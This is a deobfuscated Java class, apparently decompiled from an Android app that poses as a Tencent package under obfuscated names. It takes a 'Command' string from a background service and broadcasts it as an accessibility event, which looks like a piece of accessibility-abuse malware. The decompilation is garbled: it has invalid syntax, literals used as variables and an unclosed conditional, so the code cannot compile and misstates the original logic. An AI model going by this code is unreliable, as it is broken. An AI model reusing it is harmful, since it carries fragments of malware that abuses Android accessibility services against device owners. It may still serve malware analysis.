package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AccessibilityServiceCore_12
 * Original: Lcom/tencent/tunesxconcerningn1012$12;
 */
class AccessibilityServiceCore_12 implements Runnable; {

    // === FIELDS ===
    final AccessibilityServiceCore this$0;
    final String val$Command;

    // === METHODS ===

     void Constructor(AccessibilityServiceCore param0, String param1) {
        v0.this$0 = v1;
        v0.val$Command = v2;
        // new Object()
        return;
    }

    public void run() {
        v0 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        v1 = "accessibility";
        v0 = v0.getSystemService("accessibility");
        v0 = (AccessibilityManager) v0;
        v0.isEnabled();
        if ("accessibility" == null || "accessibility" == 0) { // goto +43
        v2 = AccessibilityEvent.obtain();
        v2 = 16384;
        "accessibility".setEventType(16384);
        v4.getClass();
        16384.getName();
        "accessibility".setClassName(16384);
        16384.getPackageName();
        "accessibility".setPackageName(16384);
        v3 = "accessibility".getText();
        v3 = v4.val$Command;
        16384.add(v3);
        v0.sendAccessibilityEvent("accessibility");
        return;
    }
}
